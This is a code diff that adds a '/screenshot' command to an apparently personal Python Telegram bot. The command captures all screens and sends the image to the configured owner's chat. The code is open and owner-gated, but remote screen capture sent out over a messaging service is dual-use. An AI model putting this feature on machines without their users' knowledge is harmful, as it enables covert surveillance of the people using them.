@@ -2,6 +2,7 @@
 
 import config
 import logging
+from PIL import ImageGrab
 from telegram import Update, ForceReply
 from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
 
@@ -13,6 +14,12 @@ def status(update: Update, context: CallbackContext) -> None:
     if update.effective_user.id == config.userId:
         update.message.reply_text('running')
 
+def screenshot(update: Update, context: CallbackContext) -> None:
+    if update.effective_user.id == config.userId:
+        screenshot = ImageGrab.grab(all_screens=True)
+        screenshot.save(r'temp/screenshot.png')
+        update.message.reply_photo(open('temp/screenshot.png', 'rb'))
+
 def echo(update: Update, context: CallbackContext) -> None:
     if update.effective_user.id == config.userId:
         update.message.reply_text(f'unknown: {update.message.text}')
@@ -21,6 +28,7 @@ def main() -> None:
     updater = Updater(config.token)
     dispatcher = updater.dispatcher
     dispatcher.add_handler(CommandHandler('status', status))
+    dispatcher.add_handler(CommandHandler('screenshot', screenshot))
     dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, echo))
     dispatcher.bot.send_message(config.userId, 'bot started')
 
